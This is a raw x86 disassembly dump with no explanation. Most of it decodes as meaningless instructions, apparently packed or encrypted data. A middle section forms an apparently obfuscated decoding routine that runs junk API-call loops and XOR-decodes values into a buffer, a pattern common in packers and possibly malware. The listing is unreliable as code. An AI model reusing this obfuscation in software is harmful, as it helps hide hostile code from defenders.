  415ec7:	jns    0x415e52
  415ec9:	dec    ecx
  415eca:	and    edi,ebx
  415ecc:	rcl    DWORD PTR [eax-0x6b],0x8d
  415ed0:	scas   al,BYTE PTR es:[edi]
  415ed1:	jns    0x415f2f
  415ed3:	outs   dx,BYTE PTR ds:[esi]
  415ed4:	jecxz  0x415f12
  415ed6:	sti    
  415ed7:	or     ah,BYTE PTR [edx]
  415ed9:	adc    al,0x26
  415edb:	xor    BYTE PTR [esi+0x217739eb],0xf3
  415ee2:	cmp    ebx,DWORD PTR [ebx]
  415ee4:	stos   DWORD PTR es:[edi],eax
  415ee5:	lods   al,BYTE PTR ds:[esi]
  415ee6:	pushf  
  415ee7:	sub    DWORD PTR [ecx-0x32],0xbbf4a98b
  415eee:	pop    edx
  415eef:	js     0x415e77
  415ef1:	jg     0x415e94
  415ef3:	outs   dx,BYTE PTR ds:[esi]
  415ef4:	inc    edx
  415ef5:	push   edx
  415ef6:	dec    ebx
  415ef7:	pop    ecx
  415ef8:	push   esp
  415ef9:	fwait
  415efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415efb:	aad    0xf8
  415efd:	jmp    0x89d9:0xc3eab476
  415f04:	aam    0x25
  415f06:	dec    esp
  415f07:	push   ds
  415f08:	push   0x2bef4264
  415f0d:	cmp    BYTE PTR [ecx+0x5b],ah
  415f10:	jne    0x415efe
  415f12:	pop    eax
  415f13:	mov    al,0xfe
  415f15:	xor    BYTE PTR [edi-0x48],bh
  415f18:	inc    edi
  415f19:	mov    edi,0x57b38b43
  415f1e:	adc    esp,ebx
  415f20:	cmp    eax,0x33bda8d1
  415f25:	pop    edx
  415f26:	push   ebp
  415f27:	xchg   ecx,eax
  415f28:	jmp    0x6c82:0x3cd2acda
  415f2f:	adc    eax,0x239ec63d
  415f34:	stos   BYTE PTR es:[edi],al
  415f35:	stc    
  415f36:	ins    BYTE PTR es:[edi],dx
  415f37:	ret    
  415f38:	fldcw  WORD PTR [edi+edi*1-0x77b64f4f]
  415f40:	xchg   ebp,eax
  415f41:	(bad)  
  415f42:	jle    0x415f33
  415f44:	pop    ecx
  415f45:	add    DWORD PTR [eax],ebx
  415f47:	push   ds
  415f48:	mov    al,0xb0
  415f4a:	adc    eax,0xf4dd5bd9
  415f4f:	mov    edi,0x9d6a65d5
  415f54:	aas    
  415f55:	or     eax,0xf0339df3
  415f5a:	pop    ebx
  415f5b:	dec    ebx
  415f5c:	inc    ebp
  415f5d:	and    DWORD PTR [esi+0x4e],edx
  415f60:	rcr    BYTE PTR [edi+ebx*8-0x3a],1
  415f64:	sub    eax,0x6d4d4274
  415f69:	mov    esp,0x89d85042
  415f6e:	mov    bl,0x9c
  415f70:	es push edi
  415f72:	or     BYTE PTR [ebx],al
  415f74:	xchg   DWORD PTR [edi],ecx
  415f76:	inc    ebp
  415f77:	js     0x415f07
  415f79:	inc    ebp
  415f7a:	mov    bl,0x7f
  415f7c:	sti    
  415f7d:	mov    ecx,0x39b60389
  415f82:	add    ah,BYTE PTR ds:[ebp-0x75]
  415f86:	xchg   ebp,eax
  415f87:	push   ebx
  415f88:	mov    bl,0xf4
  415f8a:	mov    dh,0x69
  415f8c:	mov    al,ds:0x80c2b77d
  415f91:	popa   
  415f92:	mov    cl,0x53
  415f94:	test   al,0xe2
  415f96:	xchg   esp,eax
  415f97:	xchg   esi,eax
  415f98:	dec    ebp
  415f99:	mov    edi,0xd71d67b7
  415f9e:	in     al,0xa7
  415fa0:	jmp    0x15:0x4a80a5ef
  415fa7:	popf   
  415fa8:	push   ebp
  415fa9:	dec    ecx
  415faa:	or     ah,BYTE PTR ss:[esi-0x10e6263a]
  415fb1:	scas   al,BYTE PTR es:[edi]
  415fb2:	les    ebp,FWORD PTR [edx+0x118ca1b1]
  415fb8:	(bad)  
  415fb9:	xlat   BYTE PTR ds:[ebx]
  415fba:	jae    0x415fc1
  415fbc:	dec    eax
  415fbd:	add    BYTE PTR [ecx+0x28],dl
  415fc0:	fs mov eax,0x5326f825
  415fc6:	sub    ecx,DWORD PTR [ecx]
  415fc8:	xchg   edx,eax
  415fc9:	jg     0x415fe8
  415fcb:	and    al,BYTE PTR [ecx-0x33]
  415fce:	hlt    
  415fcf:	call   0x7df8be43
  415fd4:	mov    dh,0x5c
  415fd6:	cmp    ecx,DWORD PTR [edx-0x303f1a1d]
  415fdc:	dec    esi
  415fdd:	mov    edi,0xc8b3e580
  415fe2:	adc    ah,BYTE PTR [ecx+0x38bd0423]
  415fe8:	ja     0x415fb5
  415fea:	jle    0x41603b
  415fec:	js     0x415fc2
  415fee:	push   cs
  415fef:	pop    ax
  415ff1:	jp     0x415ffd
  415ff3:	jge    0x415fa2
  415ff5:	cmp    al,BYTE PTR [edx+0x17a8ee7e]
  415ffb:	dec    ebp
  415ffc:	jg     0x416016
  415ffe:	out    dx,al
  415fff:	add    BYTE PTR [edi+eiz*1],bl
  416002:	mov    ds:0x5f60d010,al
  416007:	push   esp
  416008:	cld    
  416009:	loopne 0x415fd3
  41600b:	test   bl,0xa5
  41600e:	mov    al,0xa6
  416010:	call   0xbd6:0x3d5f08ae
  416017:	mov    eax,ds:0xe60c0313
  41601c:	(bad)
  416020:	fadd   DWORD PTR [ecx+eax*2+0x56]
  416024:	test   BYTE PTR [ebp-0x6cff2241],0xa0
  41602b:	push   ebx
  41602c:	(bad)  
  41602d:	lods   eax,DWORD PTR ds:[esi]
  41602e:	fwait
  41602f:	dec    ebx
  416030:	fld    st(3)
  416032:	test   al,0xd5
  416034:	out    dx,eax
  416035:	cdq    
  416036:	(bad)  
  416037:	loop   0x416040
  416039:	call   0x3d156e15
  41603e:	test   bl,cl
  416040:	test   al,0xb4
  416042:	cmp    al,0x7a
  416044:	in     eax,0x6e
  416046:	lds    edx,FWORD PTR [edi+0x74]
  416049:	mov    DWORD PTR [edi+0xed344bc],esi
  41604f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416050:	fs call 0x561d:0x1a54f34b
  416058:	and    ecx,eax
  41605a:	pop    ecx
  41605b:	aas    
  41605c:	in     eax,dx
  41605d:	nop
  41605e:	mov    ax,ds:0xcdc49a3f
  416064:	jmp    FWORD PTR [ebx]
  416066:	jecxz  0x416023
  416068:	lock mov dh,0x4e
  41606b:	adc    BYTE PTR [ebp-0x7f07d45f],cl
  416071:	les    ecx,FWORD PTR [edi+0x6]
  416074:	pop    ebx
  416075:	out    0x1f,eax
  416077:	loopne 0x416024
  416079:	mov    cx,0xdf45
  41607d:	les    ebx,FWORD PTR [edi]
  41607f:	push   ebp
  416080:	or     al,0x48
  416082:	pop    es
  416083:	and    al,0xf6
  416085:	xchg   esi,eax
  416086:	pop    ds
  416087:	sub    eax,0x38175941
  41608c:	fcmovnbe st,st(6)
  41608e:	int    0xcc
  416090:	rol    esp,1
  416092:	mov    al,0x59
  416094:	ins    BYTE PTR es:[edi],dx
  416095:	scas   al,BYTE PTR es:[edi]
  416096:	or     eax,0x2ba6dc2a
  41609b:	mov    bh,0x95
  41609d:	dec    esi
  41609e:	imul   esi,ebx,0xffffff93
  4160a1:	inc    edi
  4160a2:	iret   
  4160a3:	retf   0xe99c
  4160a6:	daa    
  4160a7:	dec    esp
  4160a8:	add    esp,DWORD PTR [edi]
  4160aa:	pop    edx
  4160ab:	lds    ebx,FWORD PTR [ebp-0x25]
  4160ae:	iret   
  4160af:	cmp    DWORD PTR [esi-0x61],esp
  4160b2:	push   cs
  4160b3:	ret    
  4160b4:	rcl    ecx,cl
  4160b6:	xlat   BYTE PTR ds:[ebx]
  4160b7:	sub    dl,BYTE PTR [esi-0x15]
  4160ba:	(bad)  
  4160bb:	pop    ds
  4160bc:	shl    cl,cl
  4160be:	leave  
  4160bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160c0:	dec    esi
  4160c1:	in     eax,dx
  4160c2:	loope  0x416075
  4160c4:	add    eax,0xc12775f0
  4160c9:	cmp    DWORD PTR [edi+0x55],0xffffffd8
  4160cd:	(bad)
  4160d0:	and    BYTE PTR [ecx-0x8706de9],cl
  4160d6:	mov    ebp,0xe603dc05
  4160db:	cli    
  4160dc:	mov    esi,0x4679bf9d
  4160e1:	mov    dh,0x96
  4160e3:	inc    ebx
  4160e4:	imul   BYTE PTR [edi]
  4160e6:	(bad)  
  4160e9:	sbb    al,0x9a
  4160eb:	outs   dx,BYTE PTR ds:[esi]
  4160ec:	test   DWORD PTR [ebx-0x65],esi
  4160ef:	mov    cl,0xa6
  4160f1:	push   cs
  4160f2:	ss sti 
  4160f4:	jbe    0x416141
  4160f6:	xor    cl,BYTE PTR [edx+ebx*4]
  4160f9:	out    dx,eax
  4160fa:	adc    ah,dh
  4160fc:	jbe    0x4160bb
  4160fe:	inc    esi
  4160ff:	mul    DWORD PTR [esi-0x6c822be2]
  416105:	dec    esi
  416106:	xlat   BYTE PTR ds:[ebx]
  416107:	mov    ecx,0x707eb7e0
  41610c:	cmp    BYTE PTR [ebp-0x7b16f23c],dh
  416112:	cmp    BYTE PTR [ebx+0x1d],ch
  416115:	adc    eax,DWORD PTR [esi]
  416117:	out    0x7,al
  416119:	inc    edi
  41611a:	rol    eax,cl
  41611c:	or     BYTE PTR [ebx-0x5351aa43],bl
  416122:	xchg   ecx,eax
  416123:	dec    eax
  416124:	mov    al,0xa4
  416126:	push   0xffffffe8
  416128:	adc    al,0x4b
  41612a:	inc    esp
  41612b:	data16 add BYTE PTR [esi+0x7f8b7a28],0x25
  416133:	dec    edi
  416134:	cmp    eax,0xf034587d
  416139:	je     0x416140
  41613b:	cli    
  41613c:	imul   edx,esi,0xffffffbd
  41613f:	es push ebp
  416141:	out    0xbd,eax
  416143:	xchg   esp,eax
  416144:	push   esi
  416145:	nop
  416146:	fwait
  416147:	jge    0x4161b8
  416149:	in     al,dx
  41614a:	push   ss
  41614b:	xor    eax,0x108a3227
  416150:	pop    edi
  416151:	add    BYTE PTR [eax+0x7b169e24],bl
  416157:	pop    bx
  416159:	add    DWORD PTR [esi+0x12739f19],0xffffffb9
  416160:	cmp    al,0x84
  416162:	sub    al,BYTE PTR [eax]
  416164:	ret    0x8be9
  416167:	in     eax,0x28
  416169:	xchg   ebp,eax
  41616a:	stos   BYTE PTR es:[edi],al
  41616b:	mov    ch,0xf4
  41616d:	push   0xfffffff2
  41616f:	mov    edi,0xa70d79a6
  416174:	add    ah,ah
  416176:	mov    bh,0x57
  416178:	mov    edi,ebp
  41617a:	aaa    
  41617b:	test   al,0x33
  41617d:	stos   BYTE PTR es:[edi],al
  41617e:	xor    al,0xdd
  416180:	push   0xa4446fdb
  416185:	retf   0x3420
  416188:	jo     0x4161f6
  41618a:	fwait
  41618b:	in     eax,0x1c
  41618d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41618e:	mov    dl,0x39
  416190:	jo     0x4161d2
  416192:	push   es
  416193:	mov    ebp,0x814fe25f
  416198:	clc    
  416199:	call   0x5839:0x8398355
  4161a0:	inc    esi
  4161a1:	rcl    DWORD PTR [ebx+0x394ec2f4],1
  4161a7:	clc    
  4161a8:	cwde   
  4161a9:	cmp    DWORD PTR [eax-0x4809a10b],ebx
  4161af:	lds    eax,FWORD PTR [ebx-0x330d3352]
  4161b5:	mov    al,0x66
  4161b7:	div    DWORD PTR [esi+eax*1]
  4161ba:	xchg   DWORD PTR [edx+edi*1+0x67],edx
  4161be:	test   ah,ch
  4161c0:	imul   ebx,DWORD PTR [edx-0x7f071b11],0xffffffb6
  4161c7:	pop    esp
  4161c8:	jb     0x416204
  4161ca:	sbb    DWORD PTR ss:[eax+0x51ad266a],esi
  4161d1:	sub    ch,cl
  4161d3:	out    dx,eax
  4161d4:	fmul   st,st(5)
  4161d6:	fist   WORD PTR [edx+edx*2]
  4161d9:	and    DWORD PTR [esi+esi*2],esi
  4161dc:	jae    0x41623c
  4161de:	jne    0x416218
  4161e0:	push   cs
  4161e1:	repnz push cs
  4161e3:	into   
  4161e4:	retf   
  4161e5:	fiadd  DWORD PTR [ebx]
  4161e7:	(bad)  
  4161e8:	adc    edx,DWORD PTR [edx-0x717a6666]
  4161ee:	ins    BYTE PTR es:[edi],dx
  4161ef:	push   ebx
  4161f0:	pop    ecx
  4161f1:	dec    edi
  4161f2:	call   0x1cd2:0x5265985b
  4161f9:	cwde   
  4161fa:	call   0x3d0ed690
  4161ff:	sub    eax,0xc95fe1db
  416204:	repnz sub ch,BYTE PTR [eax-0x6d]
  416208:	fucomp st(1)
  41620a:	push   ss
  41620b:	pop    esp
  41620c:	stc    
  41620d:	icebp  
  41620e:	pop    edx
  41620f:	cmp    BYTE PTR [bx+di+0x7f],bl
  416213:	ret    0x327b
  416216:	jmp    DWORD PTR [edx]
  416218:	mov    ds:0x1b0e999f,al
  41621d:	lahf   
  41621e:	imul   ebp,DWORD PTR [ecx-0x65],0x38
  416222:	pop    eax
  416223:	into   
  416224:	imul   ebx,DWORD PTR [esi-0x37],0xffffffc2
  416228:	sbb    BYTE PTR [eax],al
  41622a:	push   ebp
  41622b:	mov    ebp,esp
  41622d:	sub    esp,0x9c
  416233:	or     ecx,eax
  416235:	mov    ecx,DWORD PTR [ebp+0x8]
  416238:	adc    DWORD PTR ds:0x42a29e,0x5466
  416242:	mov    eax,0x8a98
  416247:	xor    ax,WORD PTR [ecx+0x20]
  41624b:	and    DWORD PTR ds:0x42a2d6,0x0
  416255:	jmp    0x416267
  41625a:	mov    ecx,DWORD PTR ds:0x42a2d6
  416260:	inc    ecx
  416261:	mov    DWORD PTR ds:0x42a2d6,ecx
  416267:	cmp    DWORD PTR ds:0x42a2d6,0x12
  41626e:	jae    0x4162bb
  416274:	cmp    DWORD PTR ds:0x42a2d6,0xa
  41627b:	jle    0x4162bb
  416281:	jmp    0x41629c
  416286:	push   0x5de0
  41628b:	push   0x42a26a
  416290:	push   DWORD PTR [ebp-0x28]
  416293:	push   DWORD PTR [ebp-0x10]
  416296:	call   DWORD PTR ds:0x42a3d2
  41629c:	cmp    DWORD PTR ds:0x42a2d6,0x9
  4162a3:	jne    0x4162b6
  4162a9:	mov    ecx,DWORD PTR ds:0x42a2d6
  4162af:	inc    ecx
  4162b0:	mov    DWORD PTR ds:0x42a2d6,ecx
  4162b6:	jmp    0x41625a
  4162bb:	mov    ecx,0x3b5a
  4162c0:	add    DWORD PTR ds:0x42a292,0x71f8
  4162ca:	add    ax,cx
  4162cd:	sbb    ecx,DWORD PTR ds:0x42a2d6
  4162d3:	movzx  eax,ax
  4162d6:	sbb    ecx,DWORD PTR ds:0x42a29a
  4162dc:	mov    DWORD PTR [ebp-0x10],eax
  4162df:	mov    BYTE PTR [ebp-0x1],0x7c
  4162e3:	and    DWORD PTR ds:0x42a2a2,ecx
  4162e9:	lea    eax,[ebp-0x1]
  4162ec:	mov    DWORD PTR [ebp-0xc],eax
  4162ef:	and    DWORD PTR ds:0x42a2be,0x0
  4162f9:	mov    ecx,DWORD PTR ds:0x42a2be
  4162ff:	inc    ecx
  416300:	mov    DWORD PTR ds:0x42a2be,ecx
  416306:	cmp    DWORD PTR ds:0x42a2be,0x25
  41630d:	jg     0x416346
  416313:	jmp    0x416339
  416318:	push   DWORD PTR [ebp-0x28]
  41631b:	push   0x5043
  416320:	push   DWORD PTR [ebp-0x18]
  416323:	push   DWORD PTR [ebp-0xc]
  416326:	push   DWORD PTR [ebp-0x1c]
  416329:	push   0x5d36
  41632e:	push   0x429153
  416333:	call   DWORD PTR ds:0x42a3d6
  416339:	cmp    DWORD PTR ds:0x42a2be,0x1a
  416340:	jb     0x4162f9
  416346:	mov    al,BYTE PTR [ebp-0x1]
  416349:	and    DWORD PTR ds:0x42a26e,0x0
  416353:	mov    ecx,DWORD PTR ds:0x42a26e
  416359:	inc    ecx
  41635a:	mov    DWORD PTR ds:0x42a26e,ecx
  416360:	cmp    DWORD PTR ds:0x42a26e,0x19
  416367:	jge    0x416385
  41636d:	jmp    0x416378
  416372:	call   DWORD PTR ds:0x42a3da
  416378:	cmp    DWORD PTR ds:0x42a26e,0x10
  41637f:	jb     0x416353
  416385:	mov    ecx,DWORD PTR [ebp-0xc]
  416388:	xor    al,0x7c
  41638a:	mov    DWORD PTR ds:0x42a2c6,0x2666
  416394:	inc    al
  416396:	and    DWORD PTR ds:0x42a2ce,0x42a28a
  4163a0:	mov    BYTE PTR [ecx],al
  4163a2:	sbb    DWORD PTR ds:0x42a2f6,0x5717
  4163ac:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  4163b3:	push   ebx
  4163b4:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4163bb:	mov    DWORD PTR ds:0x42a2f6,0x16
  4163c5:	cmp    DWORD PTR ds:0x42a2f6,0x0
  4163cc:	je     0x41640c
  4163d2:	cmp    DWORD PTR ds:0x42a2f6,0x1e
  4163d9:	jb     0x41640c
  4163df:	jmp    0x4163fc
  4163e4:	push   0x8db9
  4163e9:	push   DWORD PTR [ebp-0x1c]
  4163ec:	push   0x6bac
  4163f1:	push   0x6e74
  4163f6:	call   DWORD PTR ds:0x42a3de
  4163fc:	mov    eax,ds:0x42a2f6
  416401:	dec    eax
  416402:	mov    ds:0x42a2f6,eax
  416407:	jmp    0x4163c5
  41640c:	mov    ecx,DWORD PTR [ebp-0x18]
  41640f:	push   esi
  416410:	or     DWORD PTR ds:0x42a286,0x93e
  41641a:	mov    eax,0x75108aa
  41641f:	and    DWORD PTR ds:0x42a2e2,0x0
  416429:	jmp    0x41643d
  41642e:	xor    esi,esi
  416430:	add    esi,DWORD PTR ds:0x42a2e2
  416436:	inc    esi
  416437:	mov    DWORD PTR ds:0x42a2e2,esi
  41643d:	cmp    DWORD PTR ds:0x42a2e2,0x17
  416444:	jae    0x416481
  41644a:	cmp    DWORD PTR ds:0x42a2e2,0xa
  416451:	jl     0x416481
  416457:	jmp    0x416462
  41645c:	call   DWORD PTR ds:0x42a3e2
  416462:	cmp    DWORD PTR ds:0x42a2e2,0x9
  416469:	jne    0x41647c
  41646f:	mov    esi,DWORD PTR ds:0x42a2e2
  416475:	inc    esi
  416476:	mov    DWORD PTR ds:0x42a2e2,esi
  41647c:	jmp    0x41642e
  416481:	xor    ecx,eax
  416483:	mov    esi,DWORD PTR ds:0x42a2ae
  416489:	sbb    esi,DWORD PTR ds:0x42a25a
  41648f:	mov    DWORD PTR ds:0x42a2ae,esi
  416495:	mov    esi,0x3272f1
  41649a:	push   edi
  41649b:	add    ecx,esi
  41649d:	jmp    0x4164b3
  4164a2:	inc    DWORD PTR ds:0x42a26e
  4164a8:	mov    dl,BYTE PTR [ebp-0x1]
  4164ab:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4164b2:	inc    ecx
  4164b3:	mov    DWORD PTR ds:0x42a286,0x7bd4
  4164bd:	cmp    ecx,0x40
  4164c0:	jb     0x4164a2
  4164c6:	not    edx
  4164c8:	mov    edx,DWORD PTR [ebp-0x18]
  4164cb:	xor    edx,eax
  4164cd:	mov    DWORD PTR ds:0x42a302,0x3db0
  4164d7:	add    edx,esi
  4164d9:	jmp    0x416628
  4164de:	movzx  edi,WORD PTR ds:0x42a296
  4164e5:	or     DWORD PTR ds:0x42a262,edi
  4164eb:	mov    edi,DWORD PTR [ebp+0x8]
  4164ee:	adc    DWORD PTR ds:0x42a286,edx
  4164f4:	mov    ecx,0x8a98
  4164f9:	adc    DWORD PTR ds:0x42a2fe,0x3816
  416503:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416508:	and    DWORD PTR ds:0x42a2ae,0x0
  416512:	jmp    0x416524
  416517:	mov    edi,DWORD PTR ds:0x42a2ae
  41651d:	inc    edi
  41651e:	mov    DWORD PTR ds:0x42a2ae,edi
  416524:	cmp    DWORD PTR ds:0x42a2ae,0x1f
  41652b:	jae    0x41657e
  416531:	cmp    DWORD PTR ds:0x42a2ae,0xa
  416538:	jbe    0x41657e
  41653e:	jmp    0x41655d
  416543:	push   0x42a25e
  416548:	push   0x6fb7
  41654d:	push   0x429009
  416552:	push   0x4290e8
  416557:	call   DWORD PTR ds:0x42a3ea
  41655d:	cmp    DWORD PTR ds:0x42a2ae,0x9
  416564:	jne    0x416579
  41656a:	xor    edi,edi
  41656c:	xor    edi,DWORD PTR ds:0x42a2ae
  416572:	inc    edi
  416573:	mov    DWORD PTR ds:0x42a2ae,edi
  416579:	jmp    0x416517
  41657e:	mov    edi,0x3b5a
  416583:	add    DWORD PTR ds:0x42a2fa,0x42a2c2
  41658d:	add    cx,di
  416590:	sbb    DWORD PTR ds:0x42a256,0x16d8
  41659a:	movzx  ecx,cx
  41659d:	and    DWORD PTR ds:0x42a2a2,0x42a29a
  4165a7:	mov    DWORD PTR [ebp-0xc],ecx
  4165aa:	and    DWORD PTR ds:0x42a26e,0x0
  4165b4:	xor    ecx,ecx
  4165b6:	xor    ecx,DWORD PTR ds:0x42a26e
  4165bc:	inc    ecx
  4165bd:	mov    DWORD PTR ds:0x42a26e,ecx
  4165c3:	cmp    DWORD PTR ds:0x42a26e,0x19
  4165ca:	jle    0x4165f5
  4165d0:	jmp    0x4165e8
  4165d5:	push   0x594c
  4165da:	push   0x42a276
  4165df:	push   DWORD PTR [ebp-0x1c]
  4165e2:	call   DWORD PTR ds:0x42a3ee
  4165e8:	cmp    DWORD PTR ds:0x42a26e,0x17
  4165ef:	jb     0x4165b4
  4165f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4165f8:	mov    DWORD PTR ds:0x42a29a,0x62ed
  416602:	movzx  ecx,WORD PTR [ecx+edx*4]
  416606:	xor    ecx,0x8a98
  41660c:	add    ecx,edi
  41660e:	mov    DWORD PTR ds:0x42a302,0x1620
  416618:	mov    edi,DWORD PTR [ebp-0xc]
  41661b:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416622:	mov    ecx,0x8de
  416627:	inc    edx
  416628:	mov    ecx,DWORD PTR [ebp-0x10]
  41662b:	mov    DWORD PTR ds:0x42a25a,0x2d30
  416635:	cmp    edx,ecx
  416637:	jne    0x4164de
  41663d:	and    edx,edx
  41663f:	mov    ecx,DWORD PTR [ebp-0x18]
  416642:	sub    edi,DWORD PTR ds:0x42a25a
  416648:	mov    edx,DWORD PTR [ebp+0x10]
  41664b:	xor    DWORD PTR ds:0x42a2ca,0xf9d
  416655:	xor    ecx,eax
  416657:	and    DWORD PTR ds:0x42a2c2,ebx
  41665d:	add    ecx,esi
  41665f:	mov    DWORD PTR [edx],ecx
  416661:	mov    ecx,DWORD PTR [ebp-0x18]
  416664:	sbb    DWORD PTR ds:0x42a2aa,0x1e81
  41666e:	jmp    0x4189c6
  416673:	mov    dl,0x1f
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	and    edx,edx
  416678:	mov    eax,ds:0xbec98882
  41667d:	js     0x4166c3
  41667f:	cli    
  416680:	adc    DWORD PTR [esi-0x1e],ecx
  416683:	cld    
  416684:	inc    ecx
  416685:	jl     0x41660a
  416687:	inc    esi
  416688:	pop    esi
  416689:	add    DWORD PTR [ebx+0x55844b69],0x70
  416690:	sub    dh,BYTE PTR [esi]
  416692:	jne    0x4166a8
  416694:	mov    cl,0x2c
  416696:	leave  
  416697:	jae    0x4166ef
  416699:	sbb    edx,DWORD PTR [eax-0x49c977e7]
  41669f:	mov    bl,0x24
  4166a1:	pop    edi
  4166a2:	pop    ebp
  4166a3:	(bad)  
  4166a4:	int3   
  4166a5:	jecxz  0x4166e4
  4166a7:	push   edx
  4166a8:	(bad)  
  4166a9:	out    dx,al
  4166aa:	loope  0x4166bb
  4166ac:	mov    edx,0xf18f6564
  4166b1:	and    DWORD PTR [eax],ecx
  4166b3:	call   0xd876:0xaff3001e
  4166ba:	je     0x41663c
  4166bc:	sub    dh,al
  4166be:	push   eax
  4166bf:	out    0x7d,al
  4166c1:	inc    edi
  4166c2:	sub    BYTE PTR [esi-0x2bf9688f],0x6e
  4166c9:	fsub   st(6),st
  4166cb:	test   BYTE PTR [edi+0x7c],bh
  4166ce:	mov    cl,0xd9
  4166d0:	mov    ebx,0x7da8fabe
  4166d5:	push   esi
  4166d6:	xchg   edi,eax
  4166d7:	mov    dh,0x21
  4166d9:	scas   al,BYTE PTR es:[edi]
  4166da:	int3   
  4166db:	mov    edx,DWORD PTR [eax+0x30]
  4166de:	mov    DWORD PTR [edx+0x63],ecx
  4166e1:	dec    eax
  4166e2:	mov    DWORD PTR [esi-0x61abb47e],esi
  4166e8:	jl     0x4166d2
  4166ea:	adc    DWORD PTR [edx+0x4ea2f987],0xbd05e754
  4166f4:	popf   
  4166f5:	lds    esp,FWORD PTR [bp+si]
  4166f8:	pop    ebp
  4166f9:	cwde   
  4166fa:	add    DWORD PTR [edx+0x70dfc6b5],ebx
  416700:	mov    ch,0x68
  416702:	(bad)  
  416704:	(bad)  
  416706:	push   esp
  416707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416708:	fstp   TBYTE PTR [ecx]
  41670a:	mov    DWORD PTR [ebp-0x79],edx
  41670d:	xchg   ebp,eax
  41670e:	sti    
  41670f:	push   ss
  416710:	leave  
  416711:	xor    esi,edx
  416713:	sti    
  416714:	mul    BYTE PTR [edx+0x49]
  416717:	sbb    al,0xf9
  416719:	xor    esp,DWORD PTR [edi-0x64]
  41671c:	bound  ebx,QWORD PTR [edi]
  41671e:	jns    0x416766
  416720:	sub    al,0x55
  416722:	scas   eax,DWORD PTR es:[edi]
  416723:	gs sbb eax,0xe964b653
  416729:	shl    DWORD PTR [ebx+0x8],cl
  41672c:	push   esp
  41672d:	dec    ebp
  41672e:	sub    eax,0xae10d7de
  416733:	fidivr WORD PTR [esp+ebp*1+0xc]
  416737:	push   edx
  416738:	mov    al,ds:0x9f17af11
  41673d:	or     BYTE PTR [ebp+ecx*8-0x4082aa6b],al
  416744:	mov    edi,0x33764a90
  416749:	call   0x19a92fb3
  41674e:	sbb    eax,0x7d06afe5
  416753:	(bad)  
  416754:	(bad)  
  416755:	out    dx,eax
  416756:	inc    ecx
  416757:	aaa    
  416758:	ins    BYTE PTR es:[edi],dx
  416759:	add    DWORD PTR [esi-0x6],ebp
  41675c:	mov    ch,0xc4
  41675e:	push   ebp
  41675f:	mov    eax,0x8e7c67de
  416764:	mov    bl,0x3d
  416766:	jno    0x4167df
  416768:	sub    eax,0x78302b83
  41676d:	outs   dx,BYTE PTR ds:[esi]
  41676e:	les    ecx,FWORD PTR [esi+0x87b6057]
  416774:	inc    ecx
  416775:	ffree  st(6)
  416777:	push   ebp
  416778:	mov    dl,0x9e
  41677a:	xor    al,dl
  41677c:	sbb    ch,dh
  41677e:	loop   0x416767
  416780:	lea    esi,[edi+0x3a]
  416783:	imul   ebx,DWORD PTR [ecx],0xfffffffc
  416786:	lock jo 0x41676e
  416789:	jbe    0x41673a
  41678b:	sbb    eax,0x8aece8e2
  416790:	out    0xad,al
  416792:	in     al,dx
  416793:	pushf  
  416794:	mov    ch,0xf6
  416796:	mov    dh,0x2
  416798:	sbb    eax,0x73e41394
  41679d:	adc    ah,cl
  41679f:	rol    DWORD PTR [ebp+0x7d],1
  4167a2:	dec    ecx
  4167a3:	ret    0xb006
  4167a6:	push   es
  4167a7:	inc    esp
  4167a8:	xlat   BYTE PTR ds:[ebx]
  4167a9:	(bad)  
  4167aa:	das    
  4167ab:	add    DWORD PTR [edx+0x1a],ecx
  4167ae:	retf   
  4167af:	push   edi
  4167b0:	adc    eax,0x1943f7bf
  4167b5:	adc    BYTE PTR [edi],ch
  4167b7:	xchg   edx,esp
  4167b9:	xchg   edi,eax
  4167ba:	call   0x984b7d5d
  4167bf:	pushf  
  4167c0:	stos   BYTE PTR es:[edi],al
  4167c1:	dec    esp
  4167c2:	or     edi,ecx
  4167c4:	pop    eax
  4167c5:	lock retf 
  4167c7:	pop    ecx
  4167c8:	jmp    0xda6c:0xc2fd5489
  4167cf:	dec    ebx
  4167d0:	xor    BYTE PTR [esi+0x7b],bh
  4167d3:	adc    al,0xcd
  4167d5:	adc    al,0x99
  4167d7:	pusha  
  4167d8:	and    BYTE PTR [ebp-0x70606135],dh
  4167de:	aas    
  4167df:	mov    DWORD PTR [edi],0x4e6f195a
  4167e5:	fsubrp st(0),st
  4167e7:	ins    BYTE PTR es:[edi],dx
  4167e8:	push   edx
  4167e9:	and    esi,esp
  4167eb:	mov    al,0x74
  4167ed:	icebp  
  4167ee:	jne    0x416869
  4167f0:	dec    esp
  4167f1:	sub    BYTE PTR [ecx-0x9],ch
  4167f4:	xor    eax,DWORD PTR [ebx-0x51]
  4167f7:	jae    0x416832
  4167f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167fa:	inc    esp
  4167fb:	not    esi
  4167fd:	cmp    al,0x2
  4167ff:	jae    0x41684e
  416801:	scas   eax,DWORD PTR es:[edi]
  416802:	xor    al,0x5
  416804:	loope  0x416798
  416806:	ds xor dl,bh
  416809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41680a:	cs dec ebx
  41680c:	pop    eax
  41680d:	jecxz  0x4167ba
  41680f:	mov    bh,0x2e
  416811:	sub    al,0xef
  416813:	mov    edx,0x65f74d5a
  416818:	cmp    eax,0xff58a31
  41681d:	mov    ds:0x15936115,eax
  416822:	ds rol esp,cl
  416825:	pusha  
  416826:	dec    eax
  416827:	mov    cl,0xf9
  416829:	out    dx,al
  41682a:	mov    ebx,0xf884a740
  41682f:	rcl    DWORD PTR [edx],cl
  416831:	mov    esi,0xc10748bf
  416836:	xor    eax,0xea59f77d
  41683b:	xchg   edx,eax
  41683c:	or     dh,BYTE PTR [ebx+eax*2+0x7579b6f6]
  416843:	mov    dh,0xab
  416845:	loope  0x416876
  416847:	adc    DWORD PTR [ebx-0x27],ecx
  41684a:	push   ecx
  41684b:	daa    
